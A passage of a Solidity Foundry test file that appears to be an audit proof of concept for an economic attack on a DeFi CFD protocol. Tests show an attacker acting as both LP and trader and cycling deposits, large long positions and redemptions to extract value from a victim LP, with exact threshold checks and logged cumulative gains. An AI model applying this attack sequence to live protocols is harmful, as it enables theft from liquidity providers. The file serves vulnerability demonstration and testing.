    function test_OneAtomLessLpFailsSkewAdmission() public {
        _deposit(DURABLE, DURABLE_CAPITAL, true);
        _deposit(LP, 4_490_250e6 - 1, true);
        vm.warp(vm.getBlockTimestamp() + 1 hours);
        _fundTrader(TRADER, 3_002_912_706_350);
        vm.prank(TRADER);
        uint64 id = router.commitOrder(CfdTypes.Side.LONG, 2_996_900e18, 3_002_912_506_350, 1e8, false);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, _mockPythUpdateData(1e8));
        assertEq(uint256(result.status), uint256(OrderV3Types.LifecycleStatus.Failed));
        assertEq(uint256(result.terminalReason), uint256(OrderV3Types.TerminalReason.PlannerRejected));
        (uint256 size,,,,,,) = engine.positions(TRADER);
        assertEq(size, 0, "no position survives the public fallback");
    }

    /// @notice One extra LP atom is executable but loses one atom of both measured outcomes.
    function test_OneAtomMoreLpLowersGainAndVictimLoss() public {
        _economicCase(4_490_250e6 + 1, 2_996_900e18, 3_002_912_706_350, 3_002_912_506_350);
        uint256 wealth = settlementToken.balanceOf(LP) + clearinghouse.balanceAssets(TRADER);
        uint256 victim = juniorVault.convertToAssets(juniorVault.balanceOf(DURABLE));
        assertEq(wealth - (4_490_250e6 + 1 + 3_002_912_706_350), 1_194_953_596);
        assertEq(DURABLE_CAPITAL - victim, 2_393_134_934);
    }

    /// @notice An executable margin one atom lower leaves one atom of carry expense.
    /// The same maximum gain and victim loss therefore require the stated margin exactly.
    function test_OneAtomLessMarginLowersGainAndVictimLoss() public {
        _economicCase(4_490_250e6, 2_996_900e18, 3_002_912_706_349, 3_002_912_506_349);
        uint256 wealth = settlementToken.balanceOf(LP) + clearinghouse.balanceAssets(TRADER);
        uint256 victim = juniorVault.convertToAssets(juniorVault.balanceOf(DURABLE));
        assertEq(wealth - (4_490_250e6 + 3_002_912_706_349), 1_194_953_596);
        assertEq(DURABLE_CAPITAL - victim, 2_393_134_934);
    }

    /// @notice The adjacent smaller position quantum reduces both outcomes at its minimum LP depth.
    function test_OneQuantumLessPositionLowersGainAndVictimLoss() public {
        _economicCase(4_490_000e6, 2_996_800e18, 3_100_000_200_000, 3_100_000e6);
        uint256 wealth = settlementToken.balanceOf(LP) + clearinghouse.balanceAssets(TRADER);
        uint256 victim = juniorVault.convertToAssets(juniorVault.balanceOf(DURABLE));
        assertEq(wealth - (4_490_000e6 + 3_100_000_200_000), 1_194_833_586);
        assertEq(DURABLE_CAPITAL - victim, 2_392_974_977);
    }

    /// @notice One more 100-token position quantum fails at the minimum LP capital through a terminal public receipt.
    function test_NextSizeQuantumHitsSkewCap() public {
        _deposit(DURABLE, DURABLE_CAPITAL, true);
        _deposit(LP, 4_490_250e6, true);
        vm.warp(vm.getBlockTimestamp() + 1 hours);
        _fundTrader(TRADER, 4_000_000e6);
        vm.prank(TRADER);
        uint64 id = router.commitOrder(CfdTypes.Side.LONG, 2_997_000e18, 3_010_000e6, 1e8, false);
        bytes[] memory update = _mockPythUpdateData(1e8);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, update);
        assertEq(uint256(result.status), uint256(OrderV3Types.LifecycleStatus.Failed));
        assertEq(uint256(result.terminalReason), uint256(OrderV3Types.TerminalReason.PlannerRejected));
        (uint256 size,,,,,,) = engine.positions(TRADER);
        assertEq(size, 0, "successful fallback opens no position");
    }

    /// @notice The extra LP capital required by that quantum permits the open but cannot fully redeem publicly.
    function test_NextSizeQuantumHitsRedemptionCap() public {
        _deposit(DURABLE, DURABLE_CAPITAL, true);
        uint256 shares = _deposit(LP, 4_490_500e6, true);
        vm.warp(vm.getBlockTimestamp() + 1 hours);
        _fundTrader(TRADER, 4_000_000e6);
        _order(false, 2_997_000e18, 3_010_000e6);
        vm.prank(LP);
        uint256 id = juniorVault.requestRedeem(shares, LP, LP);
        vm.warp(juniorVault.depositEpochStart(id));
        bytes[] memory update = _mockPythUpdateData(1e8);
        vm.prank(KEEPER);
        router.settleLpEpoch(update);
        uint256 funded = juniorVault.claimableRedeemRequest(id, LP);
        assertLt(funded, shares, "larger position cannot fully exit LP shares");
        emit log_named_uint("unfunded LP shares", shares - funded);
    }

    /// @notice One settlement-token atom less than the measured peak capital cannot commit the same open.
    function test_OneAtomLessTraderCapitalFails() public {
        _deposit(DURABLE, DURABLE_CAPITAL, true);
        _deposit(LP, 4_490_250e6, true);
        vm.warp(vm.getBlockTimestamp() + 1 hours);
        _fundTrader(TRADER, 3_002_912_706_349);
        vm.startPrank(TRADER);
        vm.expectRevert(bytes4(keccak256("MarginClearinghouse__InsufficientFreeEquity()")));
        router.commitOrder(CfdTypes.Side.LONG, 2_996_900e18, 3_002_912_506_350, 1e8, false);
        vm.stopPrank();
    }

    /// @notice Consecutive cycles reuse redeemed LP cash and the same trader collateral.
    /// The durable LP deposits once and receives no top-up. ECON_CYCLES extends the run.
    function test_RepeatedWithoutResetOrVictimReplenishment() public {
        _deposit(DURABLE, DURABLE_CAPITAL, true);
        uint256 initialLpCapital = 4_490_250e6;
        settlementToken.mint(LP, initialLpCapital);
        _fundTrader(TRADER, 4_000_000e6);
        uint256 initialWealth = initialLpCapital + 4_000_000e6;
        uint256 priorWealth = initialWealth;
        uint256 priorVictimValue = DURABLE_CAPITAL;
        uint256 started = vm.getBlockTimestamp();
        uint256 cycles = vm.envOr("ECON_CYCLES", uint256(3));
        for (uint256 i; i < cycles; ++i) {
            uint256 baseDepth = pool.totalAssets();
            uint256 sizeAssets = ((priorVictimValue - 4_000e6) / 100e6) * 100e6;
            uint256 size = sizeAssets * 1e12;
            uint256 requiredDepth = (sizeAssets * 5) / 2;
            uint256 lpCapital = requiredDepth - baseDepth;
            assertLe(lpCapital, settlementToken.balanceOf(LP), "attacker must self-fund next LP deposit");
            uint256 shares = _deposit(LP, lpCapital, false);
            vm.warp(vm.getBlockTimestamp() + 1 hours);
            while (engine.isFadWindow() || engine.isOracleFrozen()) {
                vm.warp(vm.getBlockTimestamp() + 1 hours);
            }
            _order(false, size, sizeAssets + 10_000e6);
            vm.prank(LP);
            uint256 id = juniorVault.requestRedeem(shares, LP, LP);
            vm.warp(juniorVault.depositEpochStart(id));
            bytes[] memory update = _mockPythUpdateData(1e8);
            vm.prank(KEEPER);
            router.settleLpEpoch(update);
            uint256 funded = juniorVault.claimableRedeemRequest(id, LP);
            assertEq(funded, shares, "repeat redemption must fully fund");
            vm.prank(LP);
            juniorVault.claimRedeem(id, funded, LP, LP);
            _order(true, size, 0);
            (uint256 remainingSize,,,,,, int256 remainingVpi) = engine.positions(TRADER);
            assertEq(remainingSize, 0);
            assertEq(remainingVpi, 0);
            assertEq(juniorVault.balanceOf(LP), 0);
            uint256 wealth = settlementToken.balanceOf(LP) + clearinghouse.balanceAssets(TRADER);
            uint256 victimValue = juniorVault.convertToAssets(juniorVault.balanceOf(DURABLE));
            assertGt(wealth, priorWealth, "each completed cycle must increase attacker wealth");
            assertLt(victimValue, priorVictimValue, "each completed cycle must lower durable LP value");
            if (i < 3 || (i + 1) % 25 == 0 || i + 1 == cycles) {
                emit log_named_uint("completed cycle", i + 1);
                emit log_named_uint("cycle position notional", sizeAssets);
                emit log_named_int("cumulative attacker gain", int256(wealth) - int256(initialWealth));
                emit log_named_uint("cumulative victim loss", DURABLE_CAPITAL - victimValue);
            }
            priorWealth = wealth;
            priorVictimValue = victimValue;
        }
        emit log_named_uint("total committed seconds", vm.getBlockTimestamp() - started);
    }

    function _deposit(address who, uint256 amount, bool mint) internal returns (uint256 shares) {
        if (mint) settlementToken.mint(who, amount);
        (, uint256 cutoff) = juniorVault.getRequestEpochWindow();
        vm.warp(cutoff - 2);
        vm.startPrank(who);
        settlementToken.approve(address(juniorVault), amount);
        uint256 id = juniorVault.requestDeposit(amount, who, who);
        vm.stopPrank();
        vm.warp(juniorVault.depositEpochStart(id) + 55 minutes - 3);
        bytes[] memory update = _mockPythUpdateData(1e8);
        vm.prank(KEEPER);
        router.settleLpEpoch(update);
        uint256 claimable = juniorVault.claimableDepositRequest(id, who);
        require(claimable == amount, "DEPOSIT_CAP");
        vm.prank(who);
        shares = juniorVault.claimDeposit(id, claimable, who, who);
    }

    function _order(bool close, uint256 size, uint256 margin) internal {
        vm.prank(TRADER);
        uint64 id = router.commitOrder(CfdTypes.Side.LONG, size, margin, close ? 0 : 1e8, close);
        bytes[] memory update = _mockPythUpdateData(1e8);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, update);
        if (result.status != OrderV3Types.LifecycleStatus.Executed) {
            emit log_named_uint("order terminal reason", uint256(result.terminalReason));
            emit log_named_uint("order pending reason", uint256(result.pendingReason));
            revert("ORDER_NOT_EXECUTED");
        }
    }
}
```
